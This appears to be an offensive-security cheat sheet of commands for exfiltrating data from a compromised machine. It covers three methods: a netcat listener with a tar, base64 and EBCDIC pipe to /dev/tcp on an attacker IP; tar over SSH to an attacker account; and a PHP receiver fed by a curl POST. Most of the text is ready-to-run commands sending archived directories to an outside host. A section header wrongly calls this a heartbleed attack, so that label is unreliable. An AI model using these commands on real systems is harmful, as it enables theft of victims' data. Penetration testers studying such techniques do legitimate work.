# ------------------------------- start overview ------------------------------- # 
    ==> Quick view:  Data exfiltration is also considered a form of data theft.
    There are serveral techniques to extract data:
        - over TCP socket.
        - over SSH
        - via POST request over HTTPS 
# ------------------------------- start overview ------------------------------- # 

# ------------------------------- start heartbleed attack ------------------------------- # 
    # ---------- |over TCP socket| ---------- #
        ==> Quick View: create tcp socket on compromised machine which point to attacker machine.
        and configure netcat lisnter to receive the data.
        ==> V.I View: encode data (for example: base64 or EBCDIC) or encrypt it.

        1st: nc -nlvp 80 > datafolder.tmp
            ==> explanation: configure netcat on attacker machine.
        2nd: tar zcf - <directory_to_compress> | base64 | dd conv=ebcdic > /dev/tcp/<attack_ip>/<attacker_port>
        3rd: dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
            ==> explanation: on attack machine we are going to decode data and get original compressed direcotry.
    # ---------- |over TCP socket| ---------- #
    
    # ---------- |over SSH| ---------- #
        1st: tar zcf - <directory_to_compress> | ssh <attacker_user>@<attack_ip> "cd /tmp; tar zxpf -"
            ==> explanation: on compromised machine execute the command to compress then extract data through
            ssh connection with attacker machine and extract it in /tmp
    # ---------- |over SSH| ---------- #

    # ---------- |via POST request over HTTPS| ---------- #
        1st: <?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input'));?>
            ==> explanation: create php file on our web server (attacker machine).
        2nd: curl --data "$(tar zcf - <directory_to_compress> | base64)" https://<attack_ip>/contact.php
            ==> explanation: on compromised machine send compressed and encoded data through https.
        3rd: cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar
            ==> explanation: on attack machine decode and decompress the receive data.
    # ---------- |via POST request over HTTPS| ---------- #
# -------------------------------   end heartbleed attack ------------------------------- # 